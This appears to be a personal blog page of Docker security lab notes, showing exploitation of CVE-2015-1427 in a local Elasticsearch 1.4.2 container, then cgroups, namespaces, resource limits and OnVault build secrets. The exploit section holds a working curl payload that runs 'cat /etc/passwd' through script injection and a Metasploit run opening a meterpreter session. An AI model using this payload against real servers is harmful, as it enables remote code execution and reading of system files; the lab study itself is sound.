@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <!-- Primary Meta Tags -->
+  <title>Vizlog</title>
+  <meta name="title" content="Vizlog">
+  <meta name="description" content="Collection of unusual experiments and Ethical hacking notes">
+
+  <!-- Open Graph / Facebook -->
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="http://vshalson.tech/">
+  <meta property="og:title" content="Vizlog">
+  <meta property="og:description" content="Collection of unusual experiments and Ethical hacking notes">
+  <meta property="og:image" content="">
+
+  <!-- Twitter -->
+  <meta property="twitter:card" content="summary_large_image">
+  <meta property="twitter:url" content="http://vshalson.tech/">
+  <meta property="twitter:title" content="Vizlog">
+  <meta property="twitter:description" content="Collection of unusual experiments and Ethical hacking notes">
+  <meta property="twitter:image" content="">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- iOS Safari -->
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <!-- Chrome, Firefox OS and Opera Status Bar Color -->
+  <meta name="theme-color" content="#FFFFFF">
+  <meta property="og:title" content="Docker Security">
+    <meta name="description" content="Hands on ElasticSearch container hacking, Cgroups and Namespace and using Docker OnVault.">
+  <meta property="og:description" content="Hands on ElasticSearch container hacking, Cgroups and Namespace and using Docker OnVault.">
+    <!-- following viz change -->
+    <meta property="og:type" content="blog">
+  <title>Docker Security</title>
+  <!-- Favicon -->
+    <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fb71620e3-c96f-4528-8d97-b288c190e643%2FRengoku_kyoujurou_(kimetsu_no_yaiba).jpeg?table=collection&id=aa0c780e-41b0-4b41-8887-fe12b1fd89a1">
+    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+  <link rel="stylesheet" type="text/css"
+    href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+  <link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+  <link rel="stylesheet" type="text/css" href="css/notablog.css">
+  <link rel="stylesheet" type="text/css" href="css/theme.css">
+  <style>
+    :root {
+      font-size: 18px;
+    }
+
+    .DateTagBar {
+      margin-top: 1.0rem;
+    }
+  </style>
+</head>
+
+<body>
+  <nav class="Navbar">
+    <a href="index.html">
+      <div class="Navbar__Btn"><span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fb71620e3-c96f-4528-8d97-b288c190e643%2FRengoku_kyoujurou_(kimetsu_no_yaiba).jpeg?table=collection&id=aa0c780e-41b0-4b41-8887-fe12b1fd89a1"></span> <span>Home</span></div>
+    </a>
+                    <span class="Navbar__Delim">&centerdot;</span>
+    <a href="about.html">
+      <div class="Navbar__Btn"><span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fb0876588-8392-4afd-88f2-2b79f1fa471b%2FTwitter.jpeg?table=block&id=b68b89e0-6eee-410d-b5c3-4ed36f459df0"></span> <span>You don't know me?</span></div>
+    </a>
+                                                                                                                                  </nav>
+  <header class="Header">
+          <div class="Header__Spacer Header__Spacer--NoCover">
+    </div>
+        <div class="Header__Icon"><span>🧭</span></div>
+        <h1 class="Header__Title">Docker Security</h1>
+            <div class="DateTagBar">
+                          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
+            <a href="tag/Docker.html">Docker</a>
+          </span>
+                  </div>
+          </header>
+      <article id="https://www.notion.so/431c50b6d4934a12a2e684c1fe57a2ec" class="PageRoot"><div id="https://www.notion.so/107abe1ee59d4a3e8bf18f603991f79a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This lab was crazy one,  consciously using docker to exploit vulnerability and haha spawning reverse shell in metasploit gives same vibe of first time.
+Note for self: Learn and document exploits in golang using docker.  </span></span></p></div><h2 id="https://www.notion.so/716d33d4b1264d589cd2b3637a566428" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/716d33d4b1264d589cd2b3637a566428"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Hack ElasticSearch Container</span></span></h2><div id="https://www.notion.so/dd24f2bf29064dcb8df1e0969a03f55f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Running applications vulnerable to security exploits can expose your system to hackers. This could result in downtime, data loss or important information disclosure that can have in-reversal impact on a company.</span></span></p></div><h3 id="https://www.notion.so/2012cbc4b68e4e64bd438004f61a9500" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2012cbc4b68e4e64bd438004f61a9500"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Container Security</span></span></h3><div id="https://www.notion.so/0c6aaff3f42f44389b62149867fc8907" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Docker drops certain Linux capabilities and blocks syscalls to add a default level of security.</span></span></p></div><pre id="https://www.notion.so/4e766cb5ac444771b3ff35fb89e0f82f" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment"># launch container</span>
+docker run -d -p <span class="token number">9200</span>:9200 --name es benhall/elasticsearch:1.4.2</span></span></span></code></pre><h3 id="https://www.notion.so/15dc2f270b5747eb9c403139eb9c5b21" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/15dc2f270b5747eb9c403139eb9c5b21"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Exploit Container via CVE-2015-1427</span></span></h3><div id="https://www.notion.so/73ecc759358d40ba9bdb855b166580c4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Exploited Elasticsearch v1.4.2 search future</span></span></p></div><pre id="https://www.notion.so/22ff9a8c3f874b16ad1b45338c4d3339" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment"># insert data, cURL to add a record.</span>
+<span class="token function">curl</span> -XPUT <span class="token string">'http://localhost:9200/twitter/user/kimchy1'</span> -d '<span class="token punctuation">{</span><span class="token string">"name"</span> <span class="token builtin class-name">:</span> <span class="token string">"shay banon"</span><span class="token punctuation">}</span></span></span></span></code></pre><div id="https://www.notion.so/22ef367958f44f5b851f49f1fed9f9bd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Here we using java to execute command to print os name.</span></span></p></div><div id="https://www.notion.so/b084b78a46c9427cb6047ec1efffa172" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F331b96d2-e7ee-4a4d-b68a-777a5020b5c6%2FUntitled.png?width=692&amp;table=block&amp;id=b084b78a-46c9-427c-b604-7ec1efffa172"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F331b96d2-e7ee-4a4d-b68a-777a5020b5c6%2FUntitled.png?width=692&amp;table=block&amp;id=b084b78a-46c9-427c-b604-7ec1efffa172" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><pre id="https://www.notion.so/930eab64e3b14588800d04c92b214d1c" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment"># to read /etc/passwd</span>
+<span class="token function">curl</span> http://localhost:9200/_search?pretty -XPOST -d <span class="token string">'{"script_fields": {"myscript": {"script": "java.lang.Math.class.forName(<span class="token entity" title="\&quot;">\"</span>java.lang.Runtime<span class="token entity" title="\&quot;">\"</span>).getRuntime().exec(<span class="token entity" title="\&quot;">\"</span>cat /etc/passwd<span class="token entity" title="\&quot;">\"</span>).getText()"}}}'</span></span></span></span></code></pre><div id="https://www.notion.so/849c9f21f8924c58845f2d4e457a8e35" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F0e30dfae-cbf8-4c14-9175-7d38caf8e098%2FUntitled.png?width=1251&amp;table=block&amp;id=849c9f21-f892-4c58-845f-2d4e457a8e35"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F0e30dfae-cbf8-4c14-9175-7d38caf8e098%2FUntitled.png?width=1251&amp;table=block&amp;id=849c9f21-f892-4c58-845f-2d4e457a8e35" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><ul class="BulletedListWrapper"><li id="https://www.notion.so/db6989bb782e45248e50d435601d561c" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Docker security gives us huge advantages over running directly on the host.</span></span></li></ul><pre id="https://www.notion.so/cc5fae853b834f9c8e9fbb792c445615" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment"># Run Metasploit</span>
+docker run -it --link es:es --entrypoint <span class="token function">bash</span> benhall/metasploit
+<span class="token comment"># launch script</span>
+<span class="token function">chmod</span> +x start.sh <span class="token operator">&amp;&amp;</span> ./start.sh
+<span class="token comment"># Under msf</span>
+use exploit/multi/elasticsearch/search_groovy_script
+<span class="token builtin class-name">set</span> TARGET <span class="token number">0</span>
+<span class="token builtin class-name">set</span> RHOST es
+exploit
+<span class="token comment"># enjoy meterpreter</span></span></span></span></code></pre><div id="https://www.notion.so/e34a155d62ae4939ad74dce7953aa0cb" class="Divider"></div><h1 id="https://www.notion.so/1b45135e747444deb11a09b8813f5c10" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--1"><a class="Anchor" href="#https://www.notion.so/1b45135e747444deb11a09b8813f5c10"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">CGroups and Namespaces</span></span></h1><div id="https://www.notion.so/272d11646ff0415d884c615644bb91c9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Learning CGroups and Namespces to apply security restrictions to containers.</span></span></p></div><pre id="https://www.notion.so/794ac4c56e0942d19666393e334de99a" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment"># CGroups Example</span>
+--cpu-shares
+--cpuset-cpus
+--memory-reservation
+--kernel-memory
+--blkio-weight
+--device-read-iops
+--device-write-iops
+
+<span class="token comment"># Namespaces Example</span>
+Cgroup   CLONE_NEWCGROUP Cgroup root <span class="token function">dir</span>
+IPC      CLONE_NEWIPC    System V ipc
+Network  CLONE_NEWNET    Network device, ports,etc
+Mount    CLONE_NEWNS     Mount points
+PID      CLONE_NEWPID    Process IDs
+User     CLONE_NEWUSER   User and group IDs
+UTS      CLONE_NEWUTS    Hostname and NIS domain name</span></span></span></code></pre><h2 id="https://www.notion.so/5dfb470cdd9b4f21968a251d7fc919c6" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/5dfb470cdd9b4f21968a251d7fc919c6"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Define Memory Limits</span></span></h2><div id="https://www.notion.so/1e0de135bde847bf9d5e603c5d8297a9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It protects system from potentially malicious users or applications aim to perform </span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Denial of System </strong></span><span class="SemanticString">applications via resource exhaustion. This limit applications from memory leaks or other programming bugs.</span></span></p></div><pre id="https://www.notion.so/23af9342c0f44a42aa7ded7e0a5dfabc" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment"># memory usage limits of contianer</span>
+docker run -d --name mb100 --memory 100mm alpine <span class="token function">top</span>
+
+<span class="token comment"># identify memory usage</span>
+docker stats --no-stream</span></span></span></code></pre><h2 id="https://www.notion.so/9ea39e1ceb384592a6e191a7ece5ecaf" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/9ea39e1ceb384592a6e191a7ece5ecaf"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Define CPU Shares</span></span></h2><div id="https://www.notion.so/29c496a268f74f7b96a88092b7e14fcb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">CPU limits are based on shares, shares are weight between how much processing time one process should get compared to another.</span></span></p></div><blockquote id="https://www.notion.so/81616a2c7dc1460684bbe694e5e43d32" class="ColorfulBlock ColorfulBlock--ColorDefault Quote"><span class="SemanticStringArray"><span class="SemanticString">One process will use all resources if CPU is idle, if second process comes then CPU will be shared based on weighting.</span></span></blockquote><div id="https://www.notion.so/5ec5692013af42c18d92433e8722c796" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">--cpu-shares</code></span><span class="SemanticString"> defines share between 0-768</span></span></p></div><div id="https://www.notion.so/71f80c9faf7a45de8c86ac773293ef92" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fbf95dfef-069c-457b-bbe9-c9901dc97d27%2FUntitled.png?width=597&amp;table=block&amp;id=71f80c9f-af7a-45de-8c86-ac773293ef92"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fbf95dfef-069c-457b-bbe9-c9901dc97d27%2FUntitled.png?width=597&amp;table=block&amp;id=71f80c9f-af7a-45de-8c86-ac773293ef92" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><h2 id="https://www.notion.so/22484e31344c4eff92b2fd1e7bb56663" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/22484e31344c4eff92b2fd1e7bb56663"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Use Network Namespace</span></span></h2><pre id="https://www.notion.so/de3e6eb6a0bd4215af50b6ff419fc909" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment"># container are launched, network interface defined and create</span>
+<span class="token comment"># unique IP addr and interface</span>
+docker run -it alpine <span class="token function">ip</span> addr show
+<span class="token comment"># process have access to host machine network interface</span>
+docker run -it --net<span class="token operator">=</span>host alpine <span class="token function">ip</span> addr show
+<span class="token comment"># If the process listens on ports, they'll be listened on the host interface and mapped to the container.</span></span></span></span></code></pre><div id="https://www.notion.so/ecf46fc6df22451eac96c0fb1abe8af3" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fed3949de-bc76-4c0c-ae8c-3a99aa09ef16%2FUntitled.png?width=579&amp;table=block&amp;id=ecf46fc6-df22-451e-ac96-c0fb1abe8af3"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fed3949de-bc76-4c0c-ae8c-3a99aa09ef16%2FUntitled.png?width=579&amp;table=block&amp;id=ecf46fc6-df22-451e-ac96-c0fb1abe8af3" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/c96e3718b26f48c6a54231863fc91352" class="Divider"></div><h1 id="https://www.notion.so/cfc4d67df964401192a7726d5e8cbbb3" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--1"><a class="Anchor" href="#https://www.notion.so/cfc4d67df964401192a7726d5e8cbbb3"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Access .ssh keys during Docker build</span></span></h1><pre id="https://www.notion.so/05c9fc524edf41d889529e0812401c4f" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment"># create data to use in build within .ssh</span>
+docker run -it -v ~/.ssh:/vault/.ssh ubuntu /bin/bash -c <span class="token string">"echo pr0t3ct3d4A<span class="token variable">$$</span>w0rd > /vault/.ssh/key "</span>
+<span class="token comment"># start build secrets server.</span>
+docker run -d -p <span class="token number">172.18</span>.0.1:14242:3000 -v ~/.ssh:/vault/.ssh dockito/vault
+<span class="token comment"># run build, here it install onvault client</span>
+<span class="token function">cat</span> Dockerfile-onvault
+--
+FROM ubuntu:14.04
+RUN <span class="token function">apt-get</span> update -y <span class="token operator">&amp;&amp;</span> <span class="token punctuation">\</span>
+      <span class="token function">apt-get</span> <span class="token function">install</span> -y <span class="token function">curl</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">\</span>
+      <span class="token function">curl</span> -L <span class="token variable"><span class="token variable">$(</span><span class="token function">ip</span> route<span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'/default/{print <span class="token variable">$3</span>}'</span><span class="token variable">)</span></span>:14242/ONVAULT <span class="token operator">></span> /usr/local/bin/ONVAULT <span class="token operator">&amp;&amp;</span> <span class="token punctuation">\</span>
+      <span class="token function">chmod</span> +x /usr/local/bin/ONVAULT
+ENV <span class="token assign-left variable">REV_BREAK_CACHE</span><span class="token operator">=</span><span class="token number">1</span>
+RUN ONVAULT <span class="token builtin class-name">echo</span> ENV: <span class="token operator">&amp;&amp;</span> <span class="token function">env</span> <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> TOKEN ENV <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> <span class="token variable">$TOKEN</span>
+RUN ONVAULT <span class="token function">ls</span> -lha ~/.ssh/
+RUN ONVAULT <span class="token function">cat</span> ~/.ssh/key
+--
+<span class="token comment"># docker build output and onvault using it</span>
+docker build -f Dockerfile-onvault -t onvault-test <span class="token builtin class-name">.</span></span></span></span></code></pre><div id="https://www.notion.so/b97f4535c9a74f75b24efe785031eaa5" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F54b4f9b3-90ea-4162-aa8a-685a7ba71a2d%2FUntitled.png?width=1000&amp;table=block&amp;id=b97f4535-c9a7-4f75-b24e-fe785031eaa5"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F54b4f9b3-90ea-4162-aa8a-685a7ba71a2d%2FUntitled.png?width=1000&amp;table=block&amp;id=b97f4535-c9a7-4f75-b24e-fe785031eaa5" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><pre id="https://www.notion.so/c4bc60caddb841d69684a45d76c205ec" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment"># secret automatically removed by OnVault, to check</span>
+docker run -it onvault-test <span class="token function">ls</span> /root/.ssh</span></span></span></code></pre><div id="https://www.notion.so/756d19b1e0a94be89702c6489344d010" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This allows to use secrets as part of our build, but never expose them within the image.</span></span></p></div></article>  <footer class="Footer">
+        <div>&copy; Vizlog 2021</div>
+        <div>&centerdot;</div>
+        <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
+            rel="noopener noreferrer">Notablog</a>.
+        </div>
+    </footer>
+</body>
+
+</html>
